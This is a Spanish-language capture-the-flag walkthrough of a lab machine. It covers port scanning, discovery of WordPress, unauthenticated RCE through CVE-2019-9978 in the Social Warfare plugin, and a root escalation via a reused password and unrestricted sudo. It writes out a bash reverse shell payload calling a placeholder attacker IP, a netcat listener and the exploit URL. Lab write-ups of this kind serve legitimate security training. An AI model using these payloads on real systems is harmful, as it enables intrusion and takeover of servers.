

# PortScan
____

```
# Nmap 7.93 scan initiated Thu Nov 16 12:17:57 2023 as: nmap -sCV -p22,80 -oN targeted 192.168.204.
Nmap scan report for 192.168.204.169
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59b7dbe0ba6376afd0200311e13c0e34 (RSA)
|   256 2e20567584ca35cee36a21321fe7f59a (ECDSA)
|_  256 0d02838b1a1cec0fae74cc7bda12899e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:2B:09:A1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 16 12:18:04 2023 -- 1 IP address (1 host up) scanned in 6.65 seconds
```


# Web Enumeration
____

Hacemos una enumeración de directorios con **"GoBuster"**.
```bash
gobuster dir -u http://192.168.204.169 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

Descubriendo así un directorio existente en el servicio Web con nombre "**/wordpress**"
![[Pasted image 20231116132515.png]]

Es decir, qué está corriendo un **CMS** **WordPress** en el servicio web Apache del **:80**

# WordPress Enumeration
____

Echándole un vistazo al código fuente para ver plugins...
![[Pasted image 20231116132740.png]]

Vemos que como uno de sus **plugins** tiene el "**Social Warfare v3.5.2**" que sí indagamos sobre posibles vulnerabilidades, encontraremos la vulnerabilidad **CVE-2019-9978** qué podemos llevar a cabo un **RCE** sin estar autenticados en ésta versión de Social Warfare.

[(Click aquí para entrar al PoC del RCE en el Social Warfare v.3.5.2)](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/)

En éste caso, modificaré el payload del **PoC** con una Reverse Shell, como iremos viendo...

1. Creamos en local un "**payload.txt**".
```bash
nano payload.txt
```

Qué como **Payload** para la **Reverse Shell** tendrá este:
```bash
<pre>system('bash -c "bash -i >& /dev/tcp/192.168.x.x/PORT 0>&1"')</pre>
```

2. Nos montamos un servidor en **Python** en la ruta del Payload.
```bash
python3 -m http.server 80
```

3. Nos ponemos en escucha con el puerto que indicamos en el Payload para recibir la Shell.
```bash
nc -nlvp 443
```

5. Usamos la ruta vulnerable al **RCE** del **PoC**, para indicar nuestra IP donde tenemos el servidor montando & el nombre del payload.
```bash
website/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://IP_ATACANTE/PAYLOAD
```

![[Pasted image 20231116134704.png]]


Y recibiríamos nuestra **Reverse Shell**.

![[Pasted image 20231116134947.png]]
Ya tan sólo quedaría darle **tratamiento a la TTY**, que sino sabes darle tratamiento te recomiendo [((Leer este POST))](https://4uli.github.io/tratamiento-tty/)

# Escalada de Privilegios #1 
_____________

Indagando en los recursos **WordPress** qué desde fuera no tenemos acceso, encontraríamos el "**wp-config.php**" qué es donde está la configuración del mismo CMS, y sí le echamos un ojo encontraríamos las credenciales de la DB.

![[Pasted image 20231116135220.png]]

y viendo los usuarios válidos del sistema en el **Passwd**, encontraríamos el usuario **takis**.
![[Pasted image 20231116135351.png]]

Por ende, se me ocurre colocar ésta credencial en el usuarios takis.
![[Pasted image 20231116135502.png]]

Logrando así entrar como **takis**, gracias a una reutilización de contraseña.


# Escalda de Privilegios #2 
____

Sí como **takis**, listamos los permisos **SUDOERS**.
```bash
sudo -l
```
![[Pasted image 20231116135731.png]]

Podemos ejecutar cualquier comando como quién sea, es decir, podemos convertirnos en **root** tan fácil como:
```bash
sudo su
```

![[Pasted image 20231116135828.png]]